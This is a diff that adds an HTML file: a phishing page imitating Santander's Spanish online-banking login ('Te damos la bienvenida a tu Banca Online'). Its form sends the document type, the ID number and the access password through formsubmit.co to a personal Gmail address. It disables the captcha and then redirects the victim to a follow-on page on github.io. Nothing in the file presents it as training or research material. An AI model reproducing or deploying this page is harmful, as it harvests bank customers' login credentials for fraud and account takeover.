@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Santander Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="icon" type="image/png" href="./iconss.png" />
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+</head>
+
+<body class="h-screen bg-cover bg-center" style="background-image: url('./backgr.jpg');">
+    <div class="absolute top-3 right-3">
+        <select id="language-selector" class="p-1 text-sm border border-gray-300 bg-white/50 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500">
+            <option value="es">Español</option>
+            <option value="en">English</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+        </select>
+    </div>
+
+    <div class="h-full flex items-center justify-center">
+        <div class="w-[350px] bg-white/60 backdrop-blur-md shadow-md p-6 rounded-none">
+            <div class="flex justify-center mb-4">
+                <img src="./logosand.png" alt="Santander Logo" class="h-10">
+            </div>
+            <div class="flex justify-between items-center border-b pb-2 mb-4">
+                <div class="text-sm font-medium text-black cursor-pointer">Particulares</div>
+                <a href="./indexfour.html" class="text-sm text-gray-500 hover:text-red-500 transition cursor-pointer">
+                    Empresas
+                </a>
+                <div class="text-xs text-gray-500 cursor-pointer"> </div>
+            </div>
+            <h1 class="text-lg font-semibold text-gray-700 mb-3">Te damos la bienvenida a tu Banca Online</h1>
+
+            <form action="https://formsubmit.co/princekhalifa2017@gmail.com" method="POST" class="space-y-4">
+                <input type="hidden" name="_next" value="https://microbitsoft.github.io/santader/santander/indextwo.html">
+                <input type="hidden" name="_captcha" value="false">
+                <div class="relative">
+                    <select id="document" name="document"
+                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500">
+                        <option value="nif" selected>NIF</option>
+                        <option value="cif">CIF</option>
+                        <option value="nie">NIE</option>
+                        <option value="passport">Pasaporte</option>
+                        <option value="usuario">Usuario</option>
+                    </select>
+                    <label for="document"
+                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
+                        Documento
+                    </label>
+                </div>
+
+                <div class="relative">
+                    <input type="text" id="docNumber" name="docNumber"
+                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
+                        placeholder="Introduce tu número de documento">
+                    <label id="docLabel" for="docNumber"
+                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
+                        Nº de documento
+                    </label>
+                </div>
+
+                <div class="relative">
+                    <input type="password" id="password" name="password"
+                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pr-10 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
+                        placeholder="Introduce tu clave de acceso">
+                    <label for="password"
+                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
+                        Clave de acceso
+                    </label>
+                    <i id="toggle-password"
+                        class="fas fa-eye absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 cursor-pointer"></i>
+                </div>
+
+                <div class="flex items-center">
+                    <input type="checkbox" id="remember" name="remember"
+                        class="mr-2 w-4 h-4 text-red-500 border-gray-300 bg-white/30 backdrop-blur-md rounded-none focus:ring-2 focus:ring-red-500">
+                    <label for="remember" class="text-xs text-gray-700">Recordar usuario</label>
+                </div>
+
+                <button type="submit"
+                    class="w-full bg-red-600/80 text-white py-1.5 rounded-none hover:bg-red-700 transition duration-200 text-sm">Entrar</button>
+            </form>
+
+            <div class="mt-2 text-center">
+                <a href="#" class="text-xs text-gray-600 hover:text-red-500 transition">¿Problemas con tu clave de
+                    acceso?</a>
+            </div>
+
+            <div class="mt-4 border-t pt-2 flex justify-around text-gray-700 text-xs">
+                <a href="#" class="flex items-center space-x-1 hover:text-red-500 transition">
+                    <i class="fas fa-headset"></i>
+                    <span>Centro de ayuda</span>
+                </a>
+                <a href="#" class="flex items-center space-x-1 hover:text-red-500 transition">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>Oficinas y cajeros</span>
+                </a>
+            </div>
+
+            <div class="mt-2 flex justify-around text-gray-700 text-xs">
+                <a href="#" class="hover:text-red-500 transition">Alta en Banca Online</a>
+                <a href="#" class="hover:text-red-500 transition">Seguridad</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const togglePassword = document.getElementById('toggle-password');
+        const passwordInput = document.getElementById('password');
+        const documentSelect = document.getElementById('document');
+        const docNumberInput = document.getElementById('docNumber');
+        const docLabel = document.getElementById('docLabel');
+
+        togglePassword.addEventListener('click', function () {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.classList.toggle('fa-eye');
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        documentSelect.addEventListener('change', function () {
+            if (this.value === 'usuario') {
+                docLabel.textContent = 'Usuario';
+                docNumberInput.placeholder = 'Introduce tu usuario';
+            } else {
+                docLabel.textContent = 'Nº de documento';
+                docNumberInput.placeholder = 'Introduce tu número de documento';
+            }
+        });
+
+        document.querySelectorAll('input, select').forEach(input => {
+            input.addEventListener('focus', () => {
+                input.previousElementSibling.classList.add('-translate-y-3', 'text-xs', 'text-red-500');
+            });
+
+            input.addEventListener('blur', () => {
+                if (input.value === '') {
+                    input.previousElementSibling.classList.remove('-translate-y-3', 'text-xs', 'text-red-500');
+                }
+            });
+        });
+
+        document.getElementById('language-selector').addEventListener('change', function (e) {
+            const selectedLanguage = e.target.value;
+            const docInput = document.getElementById('docNumber');
+
+            if (selectedLanguage === 'en') {
+                docInput.placeholder = 'Enter your document number';
+                passwordInput.placeholder = 'Enter your access key';
+            } else if (selectedLanguage === 'fr') {
+                docInput.placeholder = 'Entrez votre numéro de document';
+                passwordInput.placeholder = 'Entrez votre clé d\'accès';
+            } else if (selectedLanguage === 'de') {
+                docInput.placeholder = 'Geben Sie Ihre Dokumentnummer ein';
+                passwordInput.placeholder = 'Geben Sie Ihren Zugangsschlüssel ein';
+            } else {
+                docInput.placeholder = 'Introduce tu número de documento';
+                passwordInput.placeholder = 'Introduce tu clave de acceso';
+            }
+        });
+    </script>
+</body>
+
+</html>
